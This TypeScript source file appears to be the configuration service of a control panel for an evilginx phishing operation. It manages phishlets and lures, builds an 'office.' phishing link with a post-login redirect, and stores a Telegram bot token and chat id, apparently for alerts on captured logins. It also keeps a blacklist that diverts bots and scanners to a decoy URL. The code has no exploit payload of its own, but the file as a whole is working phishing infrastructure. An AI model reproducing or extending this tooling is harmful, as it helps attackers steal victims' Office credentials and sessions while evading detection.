import * as fs from "fs";
import * as path from "path";
import chokidar, { FSWatcher } from "chokidar";
import type { Config } from "../types";
import { spawn } from "child_process";

/* eslint-disable @typescript-eslint/no-unused-vars */
/**
 * Phishlet interface representing phishlet configuration
 * Used in configuration parsing
 */
interface Phishlet {
  hostname: string;
  unauth_url: string;
  enabled: boolean;
  visible: boolean;
}

/**
 * Lure interface representing lure configuration
 * Used in handling configuration from the evilginx service
 */
interface Lure {
  hostname: string;
  id: string;
  info: string;
  og_desc: string;
  og_image: string;
  og_title: string;
  og_url: string;
  path: string;
  paused: number;
  phishlet: string;
  redirect_url: string;
  redirector: string;
  ua_filter: string;
}
/* eslint-enable @typescript-eslint/no-unused-vars */

// Define TelegramSettings interface
export interface TelegramSettings {
  botToken: string;
  chatId: string;
  activated: boolean;
}

// Update Config interface
export interface Config {
  telegram: TelegramSettings;
  redirectUrl: string;
  blacklist: {
    domains: string[];
    ips: string[];
    strings: string[];
    activated: boolean;
  };
}

export class ConfigService {
  private configPath: string;
  private blacklistPath: string;
  private dataDbPath: string;
  private blacklistWatcher: FSWatcher | null = null;
  private isInitialized: boolean = false;
  private dataDir: string;

  constructor() {
    // Simply use the local data directory
    this.dataDir = path.resolve(process.cwd(), "data");

    // Ensure data directory exists with proper permissions
    try {
      fs.mkdirSync(this.dataDir, { recursive: true, mode: 0o755 });
    } catch (error) {
      console.error("Error creating data directory:", error);
      // Continue anyway, we'll handle file creation errors later
    }

    // Set paths for local files (including symlinks)
    this.configPath = path.join(this.dataDir, "config.json");
    this.blacklistPath = path.join(this.dataDir, "blacklist.txt");
    this.dataDbPath = path.join(this.dataDir, "data.db");

    // Verify symlinks exist and are valid
    this.verifySymlinks();

    console.log("Panel data directory:", this.dataDir);
    console.log("Panel data paths:", {
      configPath: this.configPath,
      blacklistPath: this.blacklistPath,
      dataDbPath: this.dataDbPath,
    });

    // Initialize files
    this.initializeFiles();

    // Only watch blacklist for changes, not config or data.db
    if (this.isInitialized) {
      this.setupWatchers();
    }
  }

  /**
   * Verify that symlinks exist and are valid
   * Shows warnings but doesn't throw errors
   */
  private verifySymlinks(): void {
    try {
      const filesToCheck = ["config.json", "blacklist.txt", "data.db"];
      let allValid = true;

      for (const file of filesToCheck) {
        const filePath = path.join(this.dataDir, file);

        // Check if file exists
        if (!fs.existsSync(filePath)) {
          console.warn(
            `WARNING: ${file} doesn't exist in panel/data directory.`
          );
          allValid = false;
          continue;
        }

        // Check if it's a symlink
        const stats = fs.lstatSync(filePath);
        if (!stats.isSymbolicLink()) {
          console.warn(
            `WARNING: ${file} exists but is not a symlink. This may cause synchronization issues.`
          );
          allValid = false;
          continue;
        }

        // Get symlink target
        try {
          const target = fs.readlinkSync(filePath);
          const expectedTarget = `../../../.evilginx/${file}`;

          if (target !== expectedTarget) {
            console.warn(
              `WARNING: ${file} symlink points to ${target} instead of ${expectedTarget}.`
            );
            allValid = false;
          } else {
            // Check if target exists and is readable
            try {
              fs.accessSync(filePath, fs.constants.R_OK | fs.constants.W_OK);
            } catch (accessError) {
              console.warn(
                `WARNING: ${file} symlink exists but target is not accessible: ${accessError.message}`
              );
              allValid = false;
            }
          }
        } catch (linkError) {
          console.warn(
            `WARNING: Could not read symlink target for ${file}: ${linkError.message}`
          );
          allValid = false;
        }
      }

      if (allValid) {
        console.log("✅ All required symlinks are valid and accessible");
      } else {
        console.warn(
          "⚠️ Some symlinks are missing or invalid. You may need to run the init_sync_watch.sh script."
        );
        console.warn(
          "   However, do not use init_sync_watch.sh if you already have data in .evilginx,"
        );
        console.warn(
          "   as it may create default files. Instead, manually create the required symlinks."
        );
      }
    } catch (error) {
      console.error("Error verifying symlinks:", error);
    }
  }

  private initializeFiles() {
    try {
      // Check if required files exist - don't create them here
      // as they should be created by the init_sync_watch.sh script
      const configExists = fs.existsSync(this.configPath);
      const blacklistExists = fs.existsSync(this.blacklistPath);
      const dataDbExists = fs.existsSync(this.dataDbPath);

      console.log("Panel data files status:", {
        configExists,
        blacklistExists,
        dataDbExists,
      });

      // If files don't exist, they will be created by the init_sync_watch.sh script
      // We'll simply mark as initialized to continue

      this.isInitialized = true;
      console.log("File initialization completed successfully");
    } catch (error) {
      console.error("Error initializing files:", error);
      // Do not throw - we'll try to continue with limited functionality
      this.isInitialized = false;
    }
  }

  private setupWatchers() {
    try {
      // Only watch blacklist for changes for now
      this.blacklistWatcher = chokidar.watch(this.blacklistPath, {
        persistent: true,
        ignoreInitial: true,
      });

      this.blacklistWatcher.on("change", () => {
        console.log("Blacklist file changed");
      });

      console.log("File watchers set up successfully");
    } catch (error) {
      console.error("Error setting up file watchers:", error);
    }
  }

  public async readBlacklist(): Promise<string[]> {
    try {
      if (fs.existsSync(this.blacklistPath)) {
        const content = fs.readFileSync(this.blacklistPath, "utf8");
        return content.split("\n").filter((line) => line.trim() !== "");
      }
      return [];
    } catch (error) {
      console.error("Error reading blacklist:", error);
      return [];
    }
  }

  public async writeBlacklist(ips: string[]): Promise<boolean> {
    try {
      const content = ips.join("\n");
      fs.writeFileSync(this.blacklistPath, content, { mode: 0o644 });
      return true;
    } catch (error) {
      console.error("Error writing blacklist:", error);
      return false;
    }
  }

  public cleanup(): void {
    if (this.blacklistWatcher) {
      this.blacklistWatcher.close();
    }
  }

  public async readConfig(): Promise<Config | null> {
    try {
      if (fs.existsSync(this.configPath)) {
        const configData = fs.readFileSync(this.configPath, "utf8");
        return JSON.parse(configData) as Config;
      }
      return null;
    } catch (error) {
      console.error("Error reading config:", error);
      return null;
    }
  }

  public async getFullLink(): Promise<{
    fullUrl: string;
    domain: string;
    path: string;
  } | null> {
    try {
      const config = await this.readConfig();
      if (!config) return null;

      // Add null checks for all properties
      const general = config.general || {};
      const domain = general.domain || "";
      const lures = config.lures || [];
      const path = lures[0]?.path || "";
      const fullUrl = domain ? `https://office.${domain}${path}` : "";

      return {
        fullUrl,
        domain,
        path: path.replace(/^\/+/, ""), // Remove leading slash for display
      };
    } catch (error) {
      console.error("Error getting full link:", error);
      return null;
    }
  }

  public async writeConfig(config: Config): Promise<boolean> {
    try {
      // Write directly to the symlinked file in panel/data
      const configStr = JSON.stringify(config, null, 2);

      // Use safeWriteFile instead of direct fs.writeFileSync
      const result = this.safeWriteFile(this.configPath, configStr);

      if (result) {
        console.log("Successfully wrote config to:", this.configPath);
        return true;
      } else {
        console.error("Failed to write config due to safety checks");
        return false;
      }
    } catch (error) {
      console.error("Error writing config:", error);
      return false;
    }
  }

  // Helper to detect minimal/empty configs
  private isMinimalConfig(config: Config): boolean {
    // Check if config is missing key components
    if (!config) return true;

    // Check for minimal general section
    if (
      !config.general ||
      !config.general.domain ||
      config.general.domain === ""
    ) {
      return true;
    }

    // Check for empty phishlets
    if (!config.phishlets || Object.keys(config.phishlets).length === 0) {
      return true;
    }

    return false;
  }

  public async updateTelegramSettings(
    bot_token: string,
    chat_id: string
  ): Promise<boolean> {
    try {
      console.log("Updating Telegram settings:", { bot_token, chat_id });

      // Get the current config
      const config = await this.readConfig();

      if (config) {
        // Ensure general section exists
        if (!config.general) {
          config.general = {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          };
        }

        // Update telegram settings in the general section
        config.general.telegram_bot_token = bot_token;
        config.general.telegram_chat_id = chat_id;

        // Log before writing
        console.log("Writing updated config with telegram settings:", {
          token: config.general.telegram_bot_token,
          chatId: config.general.telegram_chat_id,
        });

        // Write config back to file
        const result = await this.writeConfig(config);
        console.log("Telegram settings update result:", result);
        return result;
      } else {
        // No existing config found, create a new one
        const newConfig: Config = {
          blacklist: { mode: "unauth" },
          general: {
            telegram_bot_token: bot_token,
            telegram_chat_id: chat_id,
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          },
          phishlets: {},
          lures: [],
        };

        const result = await this.writeConfig(newConfig);
        console.log("Created new config with telegram settings:", result);
        return result;
      }
    } catch (error) {
      console.error("Error updating Telegram settings:", error);
      return false;
    }
  }

  public async updateBlacklistMode(blockBots: boolean): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          blacklist: { mode: blockBots ? "unauth" : "off" },
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: "",
          },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure blacklist object exists
      config.blacklist = config.blacklist || {};

      config.blacklist.mode = blockBots ? "unauth" : "off";

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating blacklist mode:", error);
      return false;
    }
  }

  public async updateRedirectUrl(url: string): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        // Create a complete config object
        const newConfig: Config = {
          general: {
            telegram_bot_token: "",
            telegram_chat_id: "",
            autocert: true,
            dns_port: 53,
            https_port: 443,
            bind_ipv4: "",
            external_ipv4: "",
            domain: "",
            unauth_url: url,
          },
          blacklist: { mode: "off" },
          phishlets: {},
          lures: [],
        };

        return await this.writeConfig(newConfig);
      }

      // Ensure general object exists
      config.general = config.general || {};

      config.general.unauth_url = url;

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating redirect URL:", error);
      return false;
    }
  }

  public async updateLinkSettings(
    afterLoginRedirect: string,
    useCaptcha: boolean,
    linkPath: string
  ): Promise<boolean> {
    try {
      const config = await this.readConfig();
      if (!config) {
        console.error("Config not found");
        return false;
      }

      // Ensure linkPath always starts with a single forward slash
      const formattedPath = linkPath.startsWith("/")
        ? linkPath
        : `/${linkPath}`;

      // Check if lures array exists and has at least one item
      if (
        !config.lures ||
        !Array.isArray(config.lures) ||
        config.lures.length === 0
      ) {
        // Create a lure if none exists
        if (!config.lures) {
          config.lures = [];
        }
        config.lures.push({
          hostname: "",
          id: "",
          info: "",
          og_desc: "",
          og_image: "",
          og_title: "",
          og_url: "",
          path: formattedPath,
          paused: 0,
          phishlet: "office",
          redirect_url: afterLoginRedirect,
          redirector: "main",
          ua_filter: "",
        });
      } else {
        // Update first lure
        config.lures[0].path = formattedPath;
        config.lures[0].redirect_url = afterLoginRedirect;
      }

      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating link settings:", error);
      return false;
    }
  }

  // Enhanced safety checks for file operations
  private safeWriteFile(filePath: string, content: string): boolean {
    try {
      // 1. Check if file exists and has content
      const fileExists = fs.existsSync(filePath);

      if (fileExists) {
        const existingContent = fs.readFileSync(filePath, "utf8");

        // Never overwrite non-empty file with empty content
        if (
          existingContent &&
          existingContent.trim().length > 0 &&
          (!content || content.trim().length === 0)
        ) {
          console.error(
            `SAFETY: Prevented overwriting ${filePath} with empty content`
          );
          return false;
        }

        // If new content is a minimal JSON object (just {}) and existing isn't, reject
        if (
          content &&
          (content.trim() === "{}" || content.trim() === "[]") &&
          existingContent &&
          existingContent.trim() !== "{}" &&
          existingContent.trim() !== "[]"
        ) {
          console.error(
            `SAFETY: Prevented overwriting ${filePath} with empty object/array`
          );
          return false;
        }
      }

      // 2. Write the file with proper permissions
      fs.writeFileSync(filePath, content, { mode: 0o644 });
      return true;
    } catch (error) {
      console.error(`Error in safeWriteFile for ${filePath}:`, error);
      return false;
    }
  }

  public async updateConfig(key: string, value: any): Promise<boolean> {
    try {
      // Get current config
      const config = await this.readConfig();
      if (!config) {
        console.error("No existing config found for updateConfig");
        return false;
      }

      // Update only the specific key
      if (key.includes(".")) {
        // Handle nested keys like 'telegram.botToken'
        const keys = key.split(".");
        let current: any = config;

        // Traverse to the parent object
        for (let i = 0; i < keys.length - 1; i++) {
          if (!current[keys[i]]) {
            current[keys[i]] = {};
          }
          current = current[keys[i]];
        }

        // Set the value on the leaf property
        current[keys[keys.length - 1]] = value;
      } else {
        // Simple top-level key
        config[key] = value;
      }

      // Write back the full config
      return await this.writeConfig(config);
    } catch (error) {
      console.error("Error updating config:", error);
      return false;
    }
  }
}

// Create singleton instance
export const configService = new ConfigService();
